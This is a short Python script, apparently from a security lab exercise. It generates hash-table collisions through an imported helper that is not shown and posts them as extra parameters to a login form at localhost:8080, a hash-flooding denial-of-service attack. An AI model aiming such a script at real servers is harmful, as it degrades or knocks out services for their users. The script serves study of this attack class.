from requests import codes, Session

import collisions

LOGIN_FORM_URL = "http://localhost:8080/login"

# This function will send the login form
# with the colliding parameters you specify.
def do_login_form(sess, username,password,params=None):
    data_dict = {"username":username,\
                "password":password,\
                "login":"Login"
                }
    if not params is None:
        data_dict.update(params)
    response = sess.post(LOGIN_FORM_URL,data_dict)
    print(response)


def do_attack():
    sess = Session()
    # Choose any valid username and password
    uname = "victim"
    pw = "victim"

    # Get 1000 collisions
    ht_size = 2**16
    hash_key = b'\x00'*16
    colls = collisions.find_collisions(hash_key, ht_size, 1000)
    print("Collisions: {}".format(colls))
    
    # Put your colliding inputs in this dictionary as parameters.
    attack_dict = {x: 0 for x in colls}
    print(len(attack_dict))
    response = do_login_form(sess, uname, pw, attack_dict)


if __name__=='__main__':
    do_attack()
